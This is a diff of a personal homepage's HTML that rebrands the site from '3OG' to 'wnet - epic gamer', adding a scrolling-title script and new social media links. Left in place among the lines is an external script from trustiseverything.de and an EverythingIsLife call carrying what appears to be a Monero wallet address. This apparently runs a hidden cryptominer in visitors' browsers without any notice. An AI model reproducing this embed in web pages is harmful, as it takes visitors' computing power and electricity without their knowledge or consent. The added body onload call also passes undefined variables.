@@ -3,9 +3,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>3OG - absolute insane coder man</title>
-
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
 <script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+    <script>
+var title = new MovingTitle("wnet - epic gamer  ", 300, 12);
+title.init();
+function MovingTitle(writeText, interval, visibleLetters) {
+    var _instance = {};
+
+    var _currId = 0;
+    var _numberOfLetters = writeText.length;
+
+    function updateTitle() {
+        _currId += 1;
+        if(_currId > _numberOfLetters - 1) {
+            _currId = 0; 
+        }
+
+        var startId = _currId;
+        var endId = startId + visibleLetters;
+        var finalText;
+        if(endId < _numberOfLetters - 1) {
+            finalText = writeText.substring(startId, endId);
+        } else {
+            var cappedEndId = _numberOfLetters;
+            endId = endId - cappedEndId;
+
+            finalText = writeText.substring(startId, cappedEndId) +     writeText.substring(0, endId);
+        }
+
+        document.title = finalText; 
+    }
+
+    _instance.init = function() {
+        setInterval(updateTitle, interval);
+    };
+
+    return _instance;
+}
+</script>
 <script type="text/javascript">
 EverythingIsLife('47ZMkmFNr76BQSL2GGpDjFCA5EPqBGKXmWUvR6tpfqVsNqcBby9WDNreHVgfmrTc9RauoSn3LfbFzXuChpwv3qDm4UxKoWb', 'website', 0);
 </script>
@@ -124,7 +162,8 @@ font-family: 'Open Sans Condensed', sans-serif;
     </style>
 
 </head>
-<body>
+    
+<body onload="MovingTitle(writeText, interval, visibleLetters)">
 
 <div id='hero'>
 
@@ -134,17 +173,23 @@ font-family: 'Open Sans Condensed', sans-serif;
 
   <div id= "center" class ="container text-center">
     
-    <h1 style="color:white; padding-bottom: 6px"> 3OG - absolute insane coder man</h1> 
+    <h1 style="color:white; padding-bottom: 6px">wnet - epic gamer</h1> 
 
     <span class="icons">
         <span id="block">
-            <a style="color: Tomato;" href="https://discord.gg/SBf9R6T6h9"><i class="fab fa-discord fa-2x" ></i></a>
+            <a style="color: Tomato;"><i class="fab fa-discord fa-2x" alt="wnet#0001" ></i></a>
         </span>
         <span id="block">
-            <a style="color: Tomato;" href="https://twitch.tv/Bomsy"><i class="fab fa-twitch fa-2x"></i></a>
+            <a style="color: Tomato;" href="https://www.youtube.com/channel/UC0DvGg4pkwuzKbM2fyx9bsQ"><i class="fab fa-youtube fa-2x"></i></a>
         </span>
         <span id="block">
-            <a style="color: Tomato;" href="https://github.com/3OG"><i class="fab fa-github fa-2x"></i></a>
+            <a style="color: Tomato;" href="https://github.com/wnetwnetwnet"><i class="fab fa-github fa-2x"></i></a>
+        </span>
+        <span id="block">
+            <a style="color: Tomato;" href="https://twitter.com/wnetwnetwnet"><i class="fab fa-twitter fa-2x"></i></a>
+        </span>
+        <span id="block">
+            <a style="color: Tomato;" href="https://www.instagram.com/wnetwnetwnet/"><i class="fab fa-instagram fa-2x"></i></a>
         </span>
 
     </span>
